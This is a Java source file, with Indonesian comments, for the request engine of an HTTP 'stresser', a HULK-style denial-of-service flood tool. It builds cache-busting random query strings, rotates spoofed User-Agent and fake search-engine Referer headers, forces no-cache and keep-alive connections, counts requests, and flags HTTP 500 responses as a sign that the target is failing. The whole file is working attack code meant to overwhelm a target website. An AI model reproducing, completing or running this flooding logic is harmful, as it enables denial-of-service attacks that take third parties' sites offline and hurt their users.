package com.josemarcellio.stresser;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.concurrent.atomic.AtomicInteger;

public class HTTPClient {
    private static String url = "";
    private static String host = "";
    private static final List<String> headersUseragents = new ArrayList<>();
    private static final List<String> headersReferers = new ArrayList<>();
    private static final AtomicInteger requestCounter = new AtomicInteger(0);
    private static volatile boolean flag = false;

    // Mengatur URL target
    public static void setUrl(String url) {
        HTTPClient.url = url;
    }

    // Mendapatkan URL target
    public static String getUrl() {
        return url;
    }

    // Mengatur host untuk referer
    public static void setHost(String host) {
        HTTPClient.host = host;
    }

    // Inisialisasi daftar User-Agent
    public static void initializeUserAgentList() {
        headersUseragents.add("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");
        headersUseragents.add("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0");
        headersUseragents.add("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59");
        headersUseragents.add("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");
        headersUseragents.add("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0");
        headersUseragents.add("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36");
    }

    // Inisialisasi daftar referer
    public static void initializeRefererList() {
        headersReferers.add("https://www.google.com/search?q=");
        headersReferers.add("https://www.bing.com/search?q=");
        headersReferers.add("https://search.yahoo.com/search?p=");
        headersReferers.add("https://" + host + "/");
    }

    // Membuat blok string secara acak
    private static String buildBlock(int size) {
        StringBuilder outStr = new StringBuilder();
        Random random = new Random();
        for (int i = 0; i < size; i++) {
            char c = (char) (random.nextInt(26) + 'A');
            outStr.append(c);
        }
        return outStr.toString();
    }

    // Menambah jumlah request
    public static void incrementCounter() {
        requestCounter.incrementAndGet();
    }

    // Mendapatkan jumlah request
    public static int getRequestCount() {
        return requestCounter.get();
    }

    public static void setFlag(boolean value) {
        flag = value;
    }

    public static boolean isFlag() {
        return flag;
    }

    // Melakukan panggilan HTTP
    public static int httpCall(String url) {
        Random random = new Random();
        try {
            String fullUrl = url + (url.contains("?") ? "&" : "?") + buildBlock(random.nextInt(10)) + "=" + buildBlock(random.nextInt(10));
            URL obj = new URL(fullUrl);
            HttpURLConnection con = (HttpURLConnection) obj.openConnection();

            con.setRequestMethod("GET");
            con.setRequestProperty("User-Agent", headersUseragents.get(random.nextInt(headersUseragents.size())));
            con.setRequestProperty("Cache-Control", "no-cache");
            con.setRequestProperty("Accept-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.7");
            con.setRequestProperty("Referer", headersReferers.get(random.nextInt(headersReferers.size())) + buildBlock(random.nextInt(10)));
            con.setRequestProperty("Keep-Alive", Integer.toString(random.nextInt(10) + 110));
            con.setRequestProperty("Connection", "keep-alive");
            con.setRequestProperty("Host", host);

            int responseCode = con.getResponseCode();
            if (responseCode == 500) {
                setFlag(true);
                System.out.println("Error 500");
            }

            incrementCounter();
            try (BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()))) {
                in.lines().forEach(line -> {});
            }

            return responseCode;
        } catch (Exception e) {
            e.printStackTrace();
            System.exit(1);
        }
        return 200;
    }
}
